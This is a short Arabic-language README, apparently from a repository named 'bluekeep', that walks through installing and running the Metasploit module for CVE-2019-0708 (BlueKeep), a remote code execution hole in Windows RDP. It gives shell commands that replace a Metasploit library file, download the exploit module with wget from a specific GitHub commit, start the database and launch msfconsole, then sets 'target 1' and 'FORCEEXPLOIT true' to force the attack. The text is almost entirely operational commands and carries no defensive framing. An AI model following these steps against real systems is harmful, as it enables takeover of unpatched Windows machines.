# bluekeep
 CVE- 2019-0708 هذه هي ثغرة الارديبي الاخيرة رقمها
 
 
للثغرة عدة مشاكل ولغاية لحظة بدء هذا المشروع لم يقوم رابد7 الى الان بوضعها في تحديثات الميتا سبلويت وهذا الاصدر فيها عدة مشاكل



طريقة تنصيب بسيطة يجب ان تقوم بتحديث الميتا سبلويت الى اخر اصدار عن  طريق جميع هذه الاوامر

msfupdate

apt-get update

apt-get upgrade


ثم تنفيذ الاوامر الاتية

cd /usr/share/metasploit-framework/lib/msf/core/exploit/


rm rdp.rb

wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rb


mkdir /usr/share/metasploit-framework/modules/exploits/windows/rdp/


cd /usr/share/metasploit-framework/modules/exploits/windows/rdp/

wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb


الان تم التنصيب يجب اعادة تشغيل قواعدالبيانات وتشغيل الميتا سبلويت لاستخدمها عن طريق الاوامر الاتية 

service postgresql start

msfdb init 

msfconsole

الان بعض الاوامر المهمة بعد الدخول للثغرة وقبل استخدامها


set target 1


set FORCEEXPLOIT true



هذه هي اهم الاوامر المهمة بعد الدخول للثغرة لتفادي بعض الاخطاء

